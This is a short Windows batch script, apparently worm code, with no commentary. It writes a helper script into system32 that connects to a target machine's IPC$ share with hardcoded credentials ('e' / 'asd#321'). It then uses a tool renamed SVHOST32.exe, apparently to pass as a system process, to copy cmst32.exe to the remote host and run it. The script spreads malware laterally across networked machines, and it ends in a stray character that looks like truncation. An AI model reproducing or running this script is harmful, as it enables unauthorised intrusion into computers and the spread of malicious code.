@echo off
del %windir%\system32\PCtime32.bat
set vava=%windir%\system32\PCtime32.bat
echo @echo off >> %vava%
echo Smshost.exe %%1 0 >> %vava%
echo Smshost.exe %%1 1 >> %vava%
echo net use \\%%1\IPC$ "asd#321" /user:e >> %vava%
echo SVHOST32.exe \\%%1 -u e -p "asd#321" attrib.exe -r cmst32.exe >> %vava%
echo SVHOST32.exe \\%%1 -u e -p "asd#321" -f -c -d cmst32.exe -o >> %vava%
echo SVHOST32.exe \\%%1 -u e -p "asd#321" -d cmst32.exe -o >> %vava%
echo net use /del \\%%1\IPC$ >> %vava%
d